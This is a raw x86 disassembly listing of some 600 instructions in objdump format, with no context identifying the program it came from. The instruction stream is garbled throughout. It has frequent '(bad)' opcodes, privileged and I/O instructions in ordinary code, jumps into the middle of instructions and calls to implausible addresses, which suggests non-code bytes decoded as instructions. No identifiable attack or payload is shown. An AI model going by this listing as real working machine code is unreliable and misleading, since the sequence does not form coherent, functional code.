  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
